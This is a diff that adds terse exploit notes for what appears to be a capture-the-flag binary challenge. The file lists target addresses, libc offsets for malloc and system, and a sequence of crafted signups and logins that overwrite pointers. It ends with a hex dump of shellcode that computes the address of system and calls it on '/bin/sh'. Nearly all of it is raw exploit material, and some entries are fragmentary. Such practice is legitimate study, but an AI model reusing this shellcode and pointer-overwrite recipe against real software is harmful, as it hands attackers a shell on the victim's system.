@@ -1,0 +1,39 @@
+cheat_buf = F05060 6050f0!!!
+_exit = 805060 0X605080!!!
+
+cheat = 0x402FE7
+
+sign_info = [0x6050E8]
+status = [[0x6050E8]+0x28]
+location = [[[0x6050E8]+0x28]+0x28]
+
+_getchar = 605060
+puts = 185060 605018
+
+getusername = 0x403257
+nop 0x4031EF
+dword shoot=0x400CB0
+
+1.sign in with password 1 and user name cheat_buf
+
+00007f03e1c3a100 exit will jump to 08
+&status = 00007f03e1c3a1d8
+[[0x6050E8]+0x28] = 0x6050C0-0x28 = 0x605098
+&location = 00007f03e1c3a198([0x6050E8]+0x28)
+
+1185: 0000000000084130   414 FUNC    GLOBAL DEFAULT   13 malloc@@GLIBC_2.2.5
+1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+
+rax-257440
+
+step:
+1. signup with username F05060 password 1 charname 1
+2. signup with username 805060 password 1 charname 1
+3. signup with username 1 password 1 charname 1
+4. login with username 1 password 1
+5. cheat(5) and put payload
+
+00007fc9:caf28107|   48 8b 1c 25 70 50 60 00 48 81 eb a0 ed 03 00| H..%pP`.H......|
+00007fc9:caf28117|48 b8 2f 62 69 6e 2f 73 68 00 50 48 89 e7 ff d3|H./bin/sh.PH....|
+00007fc9:caf28127|90 90 90                                       |...             |
+
